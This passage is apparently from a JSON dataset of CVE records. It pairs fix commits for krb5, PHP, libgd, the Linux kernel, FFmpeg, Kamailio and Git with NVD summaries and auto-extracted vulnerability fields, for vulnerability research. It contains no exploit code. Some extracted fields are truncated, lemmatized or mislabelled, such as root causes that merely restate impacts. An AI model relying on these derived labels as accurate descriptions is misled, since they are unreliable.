AV:N\/AC:H\/Au:S\/C:N\/I:N\/A:C\/E:H\/RL:OF\/RC:C\n\nticket: 8458 (new)\ntarget_version: 1.14-next\ntarget_version: 1.13-next","summary":"The validate_as_request function in kdc_util.c in the Key Distribution Center (KDC) in MIT Kerberos 5 (aka krb5) before 1.13.6 and 1.4.x before 1.14.3, when restrict_anonymous_to_tgt is enabled, uses an incorrect client data structure, which allows remote authenticated users to cause a denial of service (NULL pointer dereference and daemon crash) via an S4U2Self request.","commit_message_1":"fix s4u2self kdc crash when anon is restricted in validate_as_request ( ) , when enforcing restrict_anonymous_to_tgt , use <file> instead of request- > client ; the latter is null when validating s4u2self request","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via an s4u2","Impact":"cause a denial of service ( pointer dereference and daemon crash )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"08c642c09c38a9c6454ab43a9b53b2a89b9eef99","cve_id":"CVE-2016-3119","cwe_id":null,"commit_message":"Fix LDAP null deref on empty arg [CVE-2016-3119]\n\nIn the LDAP KDB module's process_db_args(), strtok_r() may return NULL\nif there is an empty string in the db_args array.  Check for this case\nand avoid dereferencing a null pointer.\n\nCVE-2016-3119:\n\nIn MIT krb5 1.6 and later, an authenticated attacker with permission\nto modify a principal entry can cause kadmind to dereference a null\npointer by supplying an empty DB argument to the modify_principal\ncommand, if kadmind is configured to use the LDAP KDB module.\n\n    CVSSv2 Vector: AV:N\/AC:H\/Au:S\/C:N\/I:N\/A:C\/E:H\/RL:OF\/RC:ND\n\nticket: 8383 (new)\ntarget_version: 1.14-next\ntarget_version: 1.13-next\ntags: pullup","summary":"The process_db_args function in plugins\/kdb\/ldap\/libkdb_ldap\/ldap_principal2.c in the LDAP KDB module in kadmind in MIT Kerberos 5 (aka krb5) through 1.13.4 and 1.14.x through 1.14.1 mishandles the DB argument, which allows remote authenticated users to cause a denial of service (NULL pointer dereference and daemon crash) via a crafted request to modify a principal.","commit_message_1":"fix ldap null deref on empty arg [ <cve_id> ] in the ldap kdb module 's process_db_args ( ) , strtok_r ( ) may return null if there is an empty string in the db_args array","Vulnerability Type":"NULL pointer dereference","Attack Vector":"via a crafted request to modify a principal","Impact":"cause a denial of service ( pointer","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"3b8d4de300854b3517c7acb239b84f7726c1353c?w=1","cve_id":"CVE-2016-3078","cwe_id":"CWE-190","commit_message":"Fix bug #71923 - integer overflow in ZipArchive::getFrom*","summary":"Multiple integer overflows in php_zip.c in the zip extension in PHP before 7.0.6 allow remote attackers to cause a denial of service (heap-based buffer overflow and application crash) or possibly have unspecified other impact via a crafted call to (1) getFromIndex or (2) getFromName in the ZipArchive class.","commit_message_1":"fix bug # <number> - integer overflow in ziparchive : :getfrom *","Vulnerability Type":"integer overflow","Attack Vector":"via a crafted call","Impact":"cause a denial of service (heap-based buffer overflow and application crash) or possibly have unspecified other impact","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"2bb97f407c1145c850416a3bfbcc8cf124e68a19","cve_id":"CVE-2016-3074","cwe_id":"CWE-189","commit_message":"gd2: handle corrupt images better (CVE-2016-3074)\n\nMake sure we do some range checking on corrupted chunks.\n\nThanks to Hans Jerry Illikainen <hji@dyntopia.com> for indepth report\nand reproducer information.  Made for easy test case writing :).","summary":"Integer signedness error in GD Graphics Library 2.1.1 (aka libgd or libgd2) allows remote attackers to cause a denial of service (crash) or potentially execute arbitrary code via crafted compressed gd2 data, which triggers a heap-based buffer overflow.","commit_message_1":"handle corrupt image better ( <cve_id> ) make sure we do some range checking on corrupted chunk","Vulnerability Type":"integer signedness","Attack Vector":"via crafted compressed gd2 data , which triggers a heap - based buffer overflow","Impact":"cause a denial of service ( crash ) or potentially execute arbitrary code","Root Cause":"caused by improper bounds checking by gd_gd2.c","Attack Type":"remote attacker"},{"commit_id":"42cb14b110a5698ccf26ce59c4441722605a3743","cve_id":"CVE-2016-3070","cwe_id":"CWE-476","commit_message":"mm: migrate dirty page without clear_page_dirty_for_io etc\n\nclear_page_dirty_for_io() has accumulated writeback and memcg subtleties\nsince v2.6.16 first introduced page migration; and the set_page_dirty()\nwhich completed its migration of PageDirty, later had to be moderated to\n__set_page_dirty_nobuffers(); then PageSwapBacked had to skip that too.\n\nNo actual problems seen with this procedure recently, but if you look into\nwhat the clear_page_dirty_for_io(page)+set_page_dirty(newpage) is actually\nachieving, it turns out to be nothing more than moving the PageDirty flag,\nand its NR_FILE_DIRTY stat from one zone to another.\n\nIt would be good to avoid a pile of irrelevant decrementations and\nincrementations, and improper event counting, and unnecessary descent of\nthe radix_tree under tree_lock (to set the PAGECACHE_TAG_DIRTY which\nradix_tree_replace_slot() left in place anyway).\n\nDo the NR_FILE_DIRTY movement, like the other stats movements, while\ninterrupts still disabled in migrate_page_move_mapping(); and don't even\nbother if the zone is the same.  Do the PageDirty movement there under\ntree_lock too, where old page is frozen and newpage not yet visible:\nbearing in mind that as soon as newpage becomes visible in radix_tree, an\nun-page-locked set_page_dirty() might interfere (or perhaps that's just\nnot possible: anything doing so should already hold an additional\nreference to the old page, preventing its migration; but play safe).\n\nBut we do still need to transfer PageDirty in migrate_page_copy(), for\nthose who don't go the mapping route through migrate_page_move_mapping().\n\nSigned-off-by: Hugh Dickins <hughd@google.com>\nCc: Christoph Lameter <cl@linux.com>\nCc: \"Kirill A. Shutemov\" <kirill.shutemov@linux.intel.com>\nCc: Rik van Riel <riel@redhat.com>\nCc: Vlastimil Babka <vbabka@suse.cz>\nCc: Davidlohr Bueso <dave@stgolabs.net>\nCc: Oleg Nesterov <oleg@redhat.com>\nCc: Sasha Levin <sasha.levin@oracle.com>\nCc: Dmitry Vyukov <dvyukov@google.com>\nCc: KOSAKI Motohiro <kosaki.motohiro@jp.fujitsu.com>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The trace_writeback_dirty_page implementation in include\/trace\/events\/writeback.h in the Linux kernel before 4.4 improperly interacts with mm\/migrate.c, which allows local users to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact by triggering a certain page move.","commit_message_1":"migrate dirty page without clear_page_dirty_for_io etc clear_page_dirty_for_io ( ) ha accumulated writeback and memcg subtlety since <file>","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"by triggering a certain page move ","Impact":"cause a denial of service ( pointer dereference and system crash ) or possibly have unspecified other impact","Root Cause":"caused by the improper interaction with mm\/migrate.c","Attack Type":"local attacker"},{"commit_id":"689e59b7ffed34eba6159dcc78e87133862e3746","cve_id":"CVE-2016-3062","cwe_id":"CWE-119","commit_message":"mov: reset dref_count on realloc to keep values consistent.\n\nThis fixes a potential crash.\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>","summary":"The mov_read_dref function in libavformat\/mov.c in Libav before 11.7 and FFmpeg before 0.11 allows remote attackers to cause a denial of service (memory corruption) or execute arbitrary code via the entries value in a dref box in an MP4 file.","commit_message_1":"reset dref_count on realloc to keep value consistent","Vulnerability Type":"buffer overflow","Attack Vector":"via the entries value in a dref box in an mp4 file","Impact":"cause a denial of service ( memory corruption ) or execute arbitrary code","Root Cause":"caused by a memory corruption error","Attack Type":"remote attacker"},{"commit_id":"759c01142a5d0f364a462346168a56de28a80f52","cve_id":"CVE-2016-2847","cwe_id":"CWE-399","commit_message":"pipe: limit the per-user amount of pages allocated in pipes\n\nOn no-so-small systems, it is possible for a single process to cause an\nOOM condition by filling large pipes with data that are never read. A\ntypical process filling 4000 pipes with 1 MB of data will use 4 GB of\nmemory. On small systems it may be tricky to set the pipe max size to\nprevent this from happening.\n\nThis patch makes it possible to enforce a per-user soft limit above\nwhich new pipes will be limited to a single page, effectively limiting\nthem to 4 kB each, as well as a hard limit above which no new pipes may\nbe created for this user. This has the effect of protecting the system\nagainst memory abuse without hurting other users, and still allowing\npipes to work correctly though with less data at once.\n\nThe limit are controlled by two new sysctls : pipe-user-pages-soft, and\npipe-user-pages-hard. Both may be disabled by setting them to zero. The\ndefault soft limit allows the default number of FDs per process (1024)\nto create pipes of the default size (64kB), thus reaching a limit of 64MB\nbefore starting to create only smaller pipes. With 256 processes limited\nto 1024 FDs each, this results in 1024*64kB + (256*1024 - 1024) * 4kB =\n1084 MB of memory allocated for a user. The hard limit is disabled by\ndefault to avoid breaking existing applications that make intensive use\nof pipes (eg: for splicing).\n\nReported-by: socketpair@gmail.com\nReported-by: Tetsuo Handa <penguin-kernel@I-love.SAKURA.ne.jp>\nMitigates: CVE-2013-4312 (Linux 2.0+)\nSuggested-by: Linus Torvalds <torvalds@linux-foundation.org>\nSigned-off-by: Willy Tarreau <w@1wt.eu>\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>","summary":"fs\/pipe.c in the Linux kernel before 4.5 does not limit the amount of unread data in pipes, which allows local users to cause a denial of service (memory consumption) by creating many pipes with non-default sizes.","commit_message_1":"limit the per-user amount of page allocated in pipe on no-so-small system , it is possible for a single process to cause an oom condition by filling large pipe with data that are never read","Vulnerability Type":"Resource Management Errors","Attack Vector":"by creating many pipes with non - default sizes","Impact":"cause a denial of service ( memory consumption )","Root Cause":"does not limit the amount of unread data","Attack Type":"local attacker"},{"commit_id":"cac9b50b0d75a1d50d6c056ff65c005f3224c8e0","cve_id":"CVE-2016-2782","cwe_id":null,"commit_message":"USB: visor: fix null-deref at probe\n\nFix null-pointer dereference at probe should a (malicious) Treo device\nlack the expected endpoints.\n\nSpecifically, the Treo port-setup hack was dereferencing the bulk-in and\ninterrupt-in urbs without first making sure they had been allocated by\ncore.\n\nFixes: 1da177e4c3f4 (\"Linux-2.6.12-rc2\")\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Johan Hovold <johan@kernel.org>","summary":"The treo_attach function in drivers\/usb\/serial\/visor.c in the Linux kernel before 4.5 allows physically proximate attackers to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact by inserting a USB device that lacks a (1) bulk-in or (2) interrupt-in endpoint.","commit_message_1":"visor : fix null-deref at probe fix null-pointer dereference at probe should a ( malicious ) treo device lack the expected endpoint","Vulnerability Type":"NULL pointer dereference","Attack Vector":"by inserting a usb device that lacks a ( 1 ) bulk - in or ( 2 ) interrupt - in endpoint","Impact":"cause a denial of service ( pointer dereference and system crash ) or possibly have unspecified other impact","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"415e3d3e90ce9e18727e8843ae343eda5a58fad6","cve_id":"CVE-2016-2550","cwe_id":"CWE-399","commit_message":"unix: correctly track in-flight fds in sending process user_struct\n\nThe commit referenced in the Fixes tag incorrectly accounted the number\nof in-flight fds over a unix domain socket to the original opener\nof the file-descriptor. This allows another process to arbitrary\ndeplete the original file-openers resource limit for the maximum of\nopen files. Instead the sending processes and its struct cred should\nbe credited.\n\nTo do so, we add a reference counted struct user_struct pointer to the\nscm_fp_list and use it to account for the number of inflight unix fds.\n\nFixes: 712f4aad406bb1 (\"unix: properly account for FDs passed over unix sockets\")\nReported-by: David Herrmann <dh.herrmann@gmail.com>\nCc: David Herrmann <dh.herrmann@gmail.com>\nCc: Willy Tarreau <w@1wt.eu>\nCc: Linus Torvalds <torvalds@linux-foundation.org>\nSuggested-by: Linus Torvalds <torvalds@linux-foundation.org>\nSigned-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The Linux kernel before 4.5 allows local users to bypass file-descriptor limits and cause a denial of service (memory consumption) by leveraging incorrect tracking of descriptor ownership and sending each descriptor over a UNIX socket before closing it. NOTE: this vulnerability exists because of an incorrect fix for CVE-2013-4312.","commit_message_1":"correctly track in-flight fds in sending process user_struct the commit referenced in the fix tag incorrectly accounted the number of in-flight fds over a unix domain socket to the original opener of the file-descriptor","Vulnerability Type":"Resource Management Errors","Attack Vector":"by leveraging incorrect tracking of descriptor ownership and sending each descriptor over a unix socket before closing it","Impact":"bypass file - descriptor limits and cause a denial of service ( memory consumption )","Root Cause":"caused by the failure to correctly count the number of","Attack Type":"local attacker"},{"commit_id":"2ba1fe7a06d3624f9a7586d672b55f08f7c670f3","cve_id":"CVE-2016-2549","cwe_id":"CWE-20","commit_message":"ALSA: hrtimer: Fix stall by hrtimer_cancel()\n\nhrtimer_cancel() waits for the completion from the callback, thus it\nmust not be called inside the callback itself.  This was already a\nproblem in the past with ALSA hrtimer driver, and the early commit\n[fcfdebe70759: ALSA: hrtimer - Fix lock-up] tried to address it.\n\nHowever, the previous fix is still insufficient: it may still cause a\nlockup when the ALSA timer instance reprograms itself in its callback.\nThen it invokes the start function even in snd_timer_interrupt() that\nis called in hrtimer callback itself, results in a CPU stall.  This is\nno hypothetical problem but actually triggered by syzkaller fuzzer.\n\nThis patch tries to fix the issue again.  Now we call\nhrtimer_try_to_cancel() at both start and stop functions so that it\nwon't fall into a deadlock, yet giving some chance to cancel the queue\nif the functions have been called outside the callback.  The proper\nhrtimer_cancel() is called in anyway at closing, so this should be\nenough.\n\nReported-and-tested-by: Dmitry Vyukov <dvyukov@google.com>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Takashi Iwai <tiwai@suse.de>","summary":"sound\/core\/hrtimer.c in the Linux kernel before 4.4.1 does not prevent recursive callback access, which allows local users to cause a denial of service (deadlock) via a crafted ioctl call.","commit_message_1":"hrtimer : fix stall by hrtimer_cancel ( ) hrtimer_cancel ( ) wait for the completion from the callback , thus it must not be called inside the callback itself","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted ioctl call","Impact":"cause a denial of service ( deadlock )","Root Cause":"does not prevent recursive callback access ","Attack Type":"local attacker"},{"commit_id":"b5a663aa426f4884c71cd8580adae73f33570f0d","cve_id":"CVE-2016-2548","cwe_id":"CWE-20","commit_message":"ALSA: timer: Harden slave timer list handling\n\nA slave timer instance might be still accessible in a racy way while\noperating the master instance as it lacks of locking.  Since the\nmaster operation is mostly protected with timer->lock, we should cope\nwith it while changing the slave instance, too.  Also, some linked\nlists (active_list and ack_list) of slave instances aren't unlinked\nimmediately at stopping or closing, and this may lead to unexpected\naccesses.\n\nThis patch tries to address these issues.  It adds spin lock of\ntimer->lock (either from master or slave, which is equivalent) in a\nfew places.  For avoiding a deadlock, we ensure that the global\nslave_active_lock is always locked at first before each timer lock.\n\nAlso, ack and active_list of slave instances are properly unlinked at\nsnd_timer_stop() and snd_timer_close().\n\nLast but not least, remove the superfluous call of _snd_timer_stop()\nat removing slave links.  This is a noop, and calling it may confuse\nreaders wrt locking.  Further cleanup will follow in a later patch.\n\nActually we've got reports of use-after-free by syzkaller fuzzer, and\nthis hopefully fixes these issues.\n\nReported-by: Dmitry Vyukov <dvyukov@google.com>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Takashi Iwai <tiwai@suse.de>","summary":"sound\/core\/timer.c in the Linux kernel before 4.4.1 retains certain linked lists after a close or stop action, which allows local users to cause a denial of service (system crash) via a crafted ioctl call, related to the (1) snd_timer_close and (2) _snd_timer_stop functions.","commit_message_1":"timer : harden slave timer list handling a slave timer instance might be still accessible in a racy way while operating the master instance a it lack of locking","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted ioctl call , related to the ( 1 ) snd _ timer _ close and ( 2 ) _ snd _ timer _ stop functions","Impact":"cause a denial of service ( system crash )","Root Cause":"retains certain linked lists after a close or stop action","Attack Type":"local attacker"},{"commit_id":"af368027a49a751d6ff4ee9e3f9961f35bb4fede","cve_id":"CVE-2016-2546","cwe_id":"CWE-362","commit_message":"ALSA: timer: Fix race among timer ioctls\n\nALSA timer ioctls have an open race and this may lead to a\nuse-after-free of timer instance object.  A simplistic fix is to make\neach ioctl exclusive.  We have already tread_sem for controlling the\ntread, and extend this as a global mutex to be applied to each ioctl.\n\nThe downside is, of course, the worse concurrency.  But these ioctls\naren't to be parallel accessible, in anyway, so it should be fine to\nserialize there.\n\nReported-by: Dmitry Vyukov <dvyukov@google.com>\nTested-by: Dmitry Vyukov <dvyukov@google.com>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Takashi Iwai <tiwai@suse.de>","summary":"sound\/core\/timer.c in the Linux kernel before 4.4.1 uses an incorrect type of mutex, which allows local users to cause a denial of service (race condition, use-after-free, and system crash) via a crafted ioctl call.","commit_message_1":"timer : fix race among timer ioctls alsa timer ioctls have an open race and this may lead to a use-after-free of timer instance object","Vulnerability Type":"Race Condition","Attack Vector":"via a crafted ioctl call","Impact":"cause a denial of service ( race condition , use - after - free , and system crash )","Root Cause":"uses an incorrect type of mutex ","Attack Type":"local attacker"},{"commit_id":"ee8413b01045c74340aa13ad5bdf905de32be736","cve_id":"CVE-2016-2545","cwe_id":"CWE-362","commit_message":"ALSA: timer: Fix double unlink of active_list\n\nALSA timer instance object has a couple of linked lists and they are\nunlinked unconditionally at snd_timer_stop().  Meanwhile\nsnd_timer_interrupt() unlinks it, but it calls list_del() which leaves\nthe element list itself unchanged.  This ends up with unlinking twice,\nand it was caught by syzkaller fuzzer.\n\nThe fix is to use list_del_init() variant properly there, too.\n\nReported-by: Dmitry Vyukov <dvyukov@google.com>\nTested-by: Dmitry Vyukov <dvyukov@google.com>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Takashi Iwai <tiwai@suse.de>","summary":"The snd_timer_interrupt function in sound\/core\/timer.c in the Linux kernel before 4.4.1 does not properly maintain a certain linked list, which allows local users to cause a denial of service (race condition and system crash) via a crafted ioctl call.","commit_message_1":"timer : fix double unlink of active_list alsa timer instance object ha a couple of linked list and they are unlinked unconditionally at snd_timer_stop ( )","Vulnerability Type":"Race Condition","Attack Vector":"via a crafted ioctl call","Impact":"cause a denial of service ( race condition and system crash )","Root Cause":"does not properly maintain a certain linked list","Attack Type":"local attacker"},{"commit_id":"3567eb6af614dac436c4b16a8d426f9faed639b3","cve_id":"CVE-2016-2544","cwe_id":"CWE-362","commit_message":"ALSA: seq: Fix race at timer setup and close\n\nALSA sequencer code has an open race between the timer setup ioctl and\nthe close of the client.  This was triggered by syzkaller fuzzer, and\na use-after-free was caught there as a result.\n\nThis patch papers over it by adding a proper queue->timer_mutex lock\naround the timer-related calls in the relevant code path.\n\nReported-by: Dmitry Vyukov <dvyukov@google.com>\nTested-by: Dmitry Vyukov <dvyukov@google.com>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Takashi Iwai <tiwai@suse.de>","summary":"Race condition in the queue_delete function in sound\/core\/seq\/seq_queue.c in the Linux kernel before 4.4.1 allows local users to cause a denial of service (use-after-free and system crash) by making an ioctl call at a certain time.","commit_message_1":"seq : fix race at timer setup and close alsa sequencer code ha an open race between the timer setup ioctl and the close of the client","Vulnerability Type":"Race Condition","Attack Vector":"by making an ioctl call at a certain time","Impact":"cause a denial of service ( use - after - free and system crash )","Root Cause":"caused by a race condition","Attack Type":"local attacker"},{"commit_id":"030e2c78d3a91dd0d27fef37e91950dde333eba1","cve_id":"CVE-2016-2543","cwe_id":null,"commit_message":"ALSA: seq: Fix missing NULL check at remove_events ioctl\n\nsnd_seq_ioctl_remove_events() calls snd_seq_fifo_clear()\nunconditionally even if there is no FIFO assigned, and this leads to\nan Oops due to NULL dereference.  The fix is just to add a proper NULL\ncheck.\n\nReported-by: Dmitry Vyukov <dvyukov@google.com>\nTested-by: Dmitry Vyukov <dvyukov@google.com>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Takashi Iwai <tiwai@suse.de>","summary":"The snd_seq_ioctl_remove_events function in sound\/core\/seq\/seq_clientmgr.c in the Linux kernel before 4.4.1 does not verify FIFO assignment before proceeding with FIFO clearing, which allows local users to cause a denial of service (NULL pointer dereference and OOPS) via a crafted ioctl call.","commit_message_1":"seq : fix missing null check at remove_events ioctl snd_seq_ioctl_remove_events ( ) call snd_seq_fifo_clear ( ) unconditionally even if there is no fifo assigned , and this lead to an oops due to null dereference","Vulnerability Type":"NULL pointer dereference","Attack Vector":"via a crafted ioctl call","Impact":"cause a denial of service ( pointer dereference and oops )","Root Cause":"does not verify fifo assignment before proceeding with fifo clearing","Attack Type":"local attacker"},{"commit_id":"f50c9c853e7809810099c970780c30b0765b0643","cve_id":"CVE-2016-2385","cwe_id":"CWE-119","commit_message":"seas: safety check for target buffer size before copying message in encode_msg()\n\n- avoid buffer overflow for large SIP messages\n- reported by Stelios Tsampas","summary":"Heap-based buffer overflow in the encode_msg function in encode_msg.c in the SEAS module in Kamailio (formerly OpenSER and SER) before 4.3.5 allows remote attackers to cause a denial of service (memory corruption and process crash) or possibly execute arbitrary code via a large SIP packet.","commit_message_1":"safety check for target buffer size before copying message in encode_msg ( ) - avoid buffer overflow for large sip message - reported by stelios tsampas","Vulnerability Type":"buffer overflow","Attack Vector":"via a large sip packet","Impact":"cause a denial of service ( memory corruption and process crash ) or possibly execute arbitrary code","Root Cause":"caused by improper bounds checking by the encode_msg function","Attack Type":"remote attacker"},{"commit_id":"07d86ca93db7e5cdf4743564d98292042ec21af7","cve_id":"CVE-2016-2384","cwe_id":null,"commit_message":"ALSA: usb-audio: avoid freeing umidi object twice\n\nThe 'umidi' object will be free'd on the error path by snd_usbmidi_free()\nwhen tearing down the rawmidi interface. So we shouldn't try to free it\nin snd_usbmidi_create() after having registered the rawmidi interface.\n\nFound by KASAN.\n\nSigned-off-by: Andrey Konovalov <andreyknvl@gmail.com>\nAcked-by: Clemens Ladisch <clemens@ladisch.de>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Takashi Iwai <tiwai@suse.de>","summary":"Double free vulnerability in the snd_usbmidi_create function in sound\/usb\/midi.c in the Linux kernel before 4.5 allows physically proximate attackers to cause a denial of service (panic) or possibly have unspecified other impact via vectors involving an invalid USB descriptor.","commit_message_1":"usb-audio : avoid freeing umidi object twice the 'umidi ' object will be free 'd on the error path by snd_usbmidi_free ( ) when tearing down the rawmidi interface","Vulnerability Type":"double free","Attack Vector":"via vectors involving an invalid usb descriptor","Impact":"cause a denial of service ( panic ) or possibly have unspecified other impact","Root Cause":"caused by a double-free","Attack Type":"local attacker"},{"commit_id":"a1b14d27ed0965838350f1377ff97c93ee383492","cve_id":"CVE-2016-2383","cwe_id":"CWE-200","commit_message":"bpf: fix branch offset adjustment on backjumps after patching ctx expansion\n\nWhen ctx access is used, the kernel often needs to expand\/rewrite\ninstructions, so after that patching, branch offsets have to be\nadjusted for both forward and backward jumps in the new eBPF program,\nbut for backward jumps it fails to account the delta. Meaning, for\nexample, if the expansion happens exactly on the insn that sits at\nthe jump target, it doesn't fix up the back jump offset.\n\nAnalysis on what the check in adjust_branches() is currently doing:\n\n  \/* adjust offset of jmps if necessary *\/\n  if (i < pos && i + insn->off + 1 > pos)\n    insn->off += delta;\n  else if (i > pos && i + insn->off + 1 < pos)\n    insn->off -= delta;\n\nFirst condition (forward jumps):\n\n  Before:                         After:\n\n  insns[0]                        insns[0]\n  insns[1] <--- i\/insn            insns[1] <--- i\/insn\n  insns[2] <--- pos               insns[P] <--- pos\n  insns[3]                        insns[P]  `------| delta\n  insns[4] <--- target_X          insns[P]   `-----|\n  insns[5]                        insns[3]\n                                  insns[4] <--- target_X\n                                  insns[5]\n\nFirst case is if we cross pos-boundary and the jump instruction was\nbefore pos. This is handeled correctly. I.e. if i == pos, then this\nwould mean our jump that we currently check was the patchlet itself\nthat we just injected. Since such patchlets are self-contained and\nhave no awareness of any insns before or after the patched one, the\ndelta is correctly not adjusted. Also, for the second condition in\ncase of i + insn->off + 1 == pos, means we jump to that newly patched\ninstruction, so no offset adjustment are needed. That part is correct.\n\nSecond condition (backward jumps):\n\n  Before:                         After:\n\n  insns[0]                        insns[0]\n  insns[1] <--- target_X          insns[1] <--- target_X\n  insns[2] <--- pos <-- target_Y  insns[P] <--- pos <-- target_Y\n  insns[3]                        insns[P]  `------| delta\n  insns[4] <--- i\/insn            insns[P]   `-----|\n  insns[5]                        insns[3]\n                                  insns[4] <--- i\/insn\n                                  insns[5]\n\nSecond interesting case is where we cross pos-boundary and the jump\ninstruction was after pos. Backward jump with i == pos would be\nimpossible and pose a bug somewhere in the patchlet, so the first\ncondition checking i > pos is okay only by itself. However, i +\ninsn->off + 1 < pos does not always work as intended to trigger the\nadjustment. It works when jump targets would be far off where the\ndelta wouldn't matter. But, for example, where the fixed insn->off\nbefore pointed to pos (target_Y), it now points to pos + delta, so\nthat additional room needs to be taken into account for the check.\nThis means that i) both tests here need to be adjusted into pos + delta,\nand ii) for the second condition, the test needs to be <= as pos\nitself can be a target in the backjump, too.\n\nFixes: 9bac3d6d548e (\"bpf: allow extended BPF programs access skb fields\")\nSigned-off-by: Daniel Borkmann <daniel@iogearbox.net>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The adjust_branches function in kernel\/bpf\/verifier.c in the Linux kernel before 4.5 does not consider the delta in the backward-jump case, which allows local users to obtain sensitive information from kernel memory by creating a packet filter and then loading crafted BPF instructions.","commit_message_1":"fix branch offset adjustment on backjumps after patching ctx expansion when ctx access is used , the kernel often need to expand\/rewrite instruction , so after that patching , branch offset have to be adjusted for both forward and backward jump in the new ebpf program , but for backward jump it fails to account the delta","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"by creating a packet filter and then loading crafted bpf instructions","Impact":"obtain sensitive information from kernel memory","Root Cause":"does not consider the delta","Attack Type":"local attacker"},{"commit_id":"de1e67d0703894cb6ea782e36abb63976ab07e60","cve_id":"CVE-2016-2324","cwe_id":"CWE-119","commit_message":"list-objects: pass full pathname to callbacks\n\nWhen we find a blob at \"a\/b\/c\", we currently pass this to\nour show_object_fn callbacks as two components: \"a\/b\/\" and\n\"c\". Callbacks which want the full value then call\npath_name(), which concatenates the two. But this is an\ninefficient interface; the path is a strbuf, and we could\nsimply append \"c\" to it temporarily, then roll back the\nlength, without creating a new copy.\n\nSo we could improve this by teaching the callsites of\npath_name() this trick (and there are only 3). But we can\nalso notice that no callback actually cares about the\nbroken-down representation, and simply pass each callback\nthe full path \"a\/b\/c\" as a string. The callback code becomes\neven simpler, then, as we do not have to worry about freeing\nan allocated buffer, nor rolling back our modification to\nthe strbuf.\n\nThis is theoretically less efficient, as some callbacks\nwould not bother to format the final path component. But in\npractice this is not measurable. Since we use the same\nstrbuf over and over, our work to grow it is amortized, and\nwe really only pay to memcpy a few bytes.\n\nSigned-off-by: Jeff King <peff@peff.net>\nSigned-off-by: Junio C Hamano <gitster@pobox.com>","summary":"Integer overflow in Git before 2.7.4 allows remote attackers to execute arbitrary code via a (1) long filename or (2) many nested trees, which triggers a heap-based buffer overflow.","commit_message_1":"pas full pathname to callback when we find a blob at `` a\/b\/c '' , we currently pas this to our show_object_fn callback a two component : `` a\/b\/ '' and `` c ''","Vulnerability Type":"buffer overflow","Attack Vector":"via a ( 1 ) long filename or ( 2 ) many nested trees , which triggers a heap - based buffer overflow","Impact":"execute arbitrary code","Root Cause":"triggers a heap-based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"34fa79a6cde56d6d428ab0d3160cb094ebad3305","cve_id":"CVE-2016-2315","cwe_id":"CWE-119","commit_message":"prefer memcpy to strcpy\n\nWhen we already know the length of a string (e.g., because\nwe just malloc'd to fit it), it's nicer to use memcpy than\nstrcpy, as it makes it more obvious that we are not going to\noverflow the buffer (because the size we pass matches the\nsize in the allocation).\n\nThis also eliminates calls to strcpy, which make auditing\nthe code base harder.\n\nSigned-off-by: Jeff King <peff@peff.net>\nSigned-off-by: Junio C Hamano <gitster@pobox.com>","summary":"revision.c in git before 2.7.4 uses an incorrect integer data type, which allows remote attackers to execute arbitrary code via a (1) long filename or (2) many nested trees, leading to a heap-based buffer overflow.","commit_message_1":"prefer memcpy to strcpy when we already know the length of a string ( <file>","Vulnerability Type":"buffer overflow","Attack Vector":"via a ( 1 ) long filename or ( 2 ) many nested trees , leading to a heap - based buffer overflow","Impact":"execute arbitrary code","Root Cause":"uses an incorrect integer data type","Attack Type":"remote attacker"},{"commit_id":"4ec0ef3a82125efc36173062a50624550a900ae0","cve_id":"CVE-2016-2188","cwe_id":null,"commit_message":"USB: iowarrior: fix oops with malicious USB descriptors\n\nThe iowarrior driver expects at least one valid endpoint.  If given\nmalicious descriptors that specify 0 for the number of endpoints,\nit will crash in the probe function.  Ensure there is at least\none endpoint on the interface before using it.\n\nThe full report of this issue can be found here:\nhttp:\/\/seclists.org\/bugtraq\/2016\/Mar\/87\n\nReported-by: Ralf Spenneberg <ralf@spenneberg.net>\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Josh Boyer <jwboyer@fedoraproject.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"The iowarrior_probe function in drivers\/usb\/misc\/iowarrior.c in the Linux kernel before 4.5.1 allows physically proximate attackers to cause a denial of service (NULL pointer dereference and system crash) via a crafted endpoints value in a USB device descriptor.","commit_message_1":"iowarrior : fix oops with malicious usb descriptor the iowarrior driver expects at least one valid endpoint","Vulnerability Type":"NULL pointer dereference","Attack Vector":"via a crafted endpoints value in a usb device descriptor","Impact":"cause a denial of service ( pointer dereference and system crash )","Root Cause":"caused by an error on invalid USB device descriptors (iowarrior driver)","Attack Type":"local attacker"},{"commit_id":"162f98dea487206d9ab79fc12ed64700667a894d","cve_id":"CVE-2016-2187","cwe_id":null,"commit_message":"Input: gtco - fix crash on detecting device without endpoints\n\nThe gtco driver expects at least one valid endpoint. If given malicious\ndescriptors that specify 0 for the number of endpoints, it will crash in\nthe probe function. Ensure there is at least one endpoint on the interface\nbefore using it.\n\nAlso let's fix a minor coding style issue.\n\nThe full correct report of this issue can be found in the public\nRed Hat Bugzilla:\n\nhttps:\/\/bugzilla.redhat.com\/show_bug.cgi?id=1283385\n\nReported-by: 